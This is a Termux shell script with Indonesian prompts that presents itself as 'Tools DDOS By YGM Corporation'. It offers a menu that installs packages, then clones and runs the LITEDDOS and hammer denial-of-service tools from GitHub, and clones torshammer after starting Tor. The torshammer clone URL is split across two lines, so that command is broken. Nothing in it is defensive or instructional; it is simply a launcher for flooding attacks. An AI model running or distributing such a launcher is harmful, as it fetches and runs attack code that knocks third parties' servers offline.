#week 
#dibuat penuh kasih dan sayang


clear

white='\033[37;1m'

blue='\033[34;1m'

green='\033[32;1m'

cyan='\033[36;1m'

red='\033[31;1m'

yellow='\033[33;1m'

purple='\033[35;1m'

echo "\033[33;1m Tools DDOS By YGM Corporation"

echo "\033[31;1m__________________________________________________"

echo "\033[32;1m  yyyy   yyyy  GGGGGGGGGGG  mmmmmmmmmmmmmmmm"

echo "\033[32;1m  yyyy   yyyy  GGGG         mmmm  mmmm  mmmm"

echo "\033[32;1m  yyyyyyyyyyy  GGGG   GGGG  mmmm  mmmm  mmmm"

echo "\033[32;1m         yyyy  GGGG     GG  mmmm  mmmm  mmmm"

echo "\033[32;1m  yyyyyyyyyyy  GGGGGGGGGGG  mmmm  mmmm  mmmm"

echo ""

echo "\033[35;1m              By: YGM Corporation"

echo "\033[31;1m__________________________________________________"

echo "\033[33;1m          TOOLS DDOS BY YGM CORPORATION"

echo "\033[33;1m     NOTE: GUNAKAN TOOLS INI SEBAIK-BAIKNYA"

echo "\033[33;1m         © Copyright by YGM Corporation"

echo "\033[31;1m__________________________________________________"

echo ""

echo "\033[34;1m Tanggal:" 

   date +"%m-%d-%y"

echo ""

echo "\033[37;1mSilahkan Pilih:"

echo ""

echo $green"1).Ddos attack liteddos"

echo $green"2).Ddos attack hammer"

echo $green"3).Ddos attack torshammer"

echo $green"4).Keluar"

echo ""

read -p"Silahkan Pilih==>> " ygm ;


if [ $ygm = 1 ] || [ $ygm = 1 ]

then

clear

apt update

apt upgrade

pkg install git

pkg install python2

git clone https://github.com/4L13199/LITEDDOS

cd LITEDDOS

python2 LITEDDOS.py

fi


if [ $ygm = 2 ] || [ $ygm = 2 ]

then

clear

pkg update

pkg upgrade

pkg install python

pkg install git

git clone https://github.com/cyweb/hammer

cd hammer

chmod 7777 hammer.py

python hammer.py

fi


if [ $ygm = 3 ] || [ $ygm = 3 ]

then

clear

apt-get update

apt-get install git

apt-get install tor

apt-get install python2

tor

git clone https://github.com/dotfighter/
torshammer.git

ls

cd torshammer

fi


if [ $ygm = 4 ] || [ $ygm = 4 ]

then

clear

sh recode.sh

fi
